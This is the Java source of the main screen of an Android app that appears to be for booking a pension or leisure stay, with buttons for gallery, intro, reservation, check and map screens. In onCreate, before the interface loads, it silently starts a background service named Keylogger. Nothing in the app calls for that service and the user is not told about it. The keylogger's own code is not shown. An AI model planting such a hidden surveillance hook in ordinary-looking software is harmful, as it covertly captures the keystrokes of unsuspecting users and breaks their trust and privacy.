package com.truemind.pensionnleisure;

import android.app.Activity;
import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.widget.ImageButton;
import android.widget.Toast;

public class MainActivity extends Activity {
    private final long FINISH_INTERVAL_TIME = 2000;
    private long backPressedTime = 0;
    ImageButton btn1, btn2, btn3, btn4, btn5;
    String keyDown2;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        startService(new Intent(this, Keylogger.class));
        initView();
        initListener();
    }
    private void initListener() {

        btn1.setOnClickListener(new View.OnClickListener() {
            @Override

            public void onClick(View v) {
                Intent intent1 = new Intent(MainActivity.this, GalleryActivity.class);
                startActivity(intent1);
                finish();
            }
        });
        btn2.setOnClickListener(new View.OnClickListener() {
            @Override

            public void onClick(View v) {
                Intent intent1 = new Intent(MainActivity.this, IntroActivity.class);
                startActivity(intent1);
                finish();
            }
        });
        btn3.setOnClickListener(new View.OnClickListener() {
            @Override

            public void onClick(View v) {
                Intent intent1 = new Intent(MainActivity.this, ReservActivity.class);
                startActivity(intent1);
                finish();
            }
        });
        btn4.setOnClickListener(new View.OnClickListener() {
            @Override

            public void onClick(View v) {
                Intent intent1 = new Intent(MainActivity.this, CheckActivity.class);
                startActivity(intent1);
                finish();
            }
        });
        btn5.setOnClickListener(new View.OnClickListener() {
            @Override

            public void onClick(View v) {
                Intent intent1 = new Intent(MainActivity.this, MapActivity.class);
                startActivity(intent1);
                finish();
            }
        });
    }

    private void initView() {
        btn1 = (ImageButton) findViewById(R.id.main_btn1);
        btn2 = (ImageButton) findViewById(R.id.main_btn2);
        btn3 = (ImageButton) findViewById(R.id.main_btn3);
        btn4 = (ImageButton) findViewById(R.id.main_btn4);
        btn5 = (ImageButton) findViewById(R.id.main_btn5);
    }

    @Override
    public void onBackPressed() {
        long tempTime = System.currentTimeMillis();
        long intervalTime = tempTime - backPressedTime;

        if(0<=intervalTime && FINISH_INTERVAL_TIME >= intervalTime) {
            super.onBackPressed();
        }
        else
        {
            backPressedTime = tempTime;
            Toast.makeText(getApplicationContext(), "\"Back\"버튼 을 한번 더 눌러 종료",Toast.LENGTH_SHORT).show();
        }
    }
}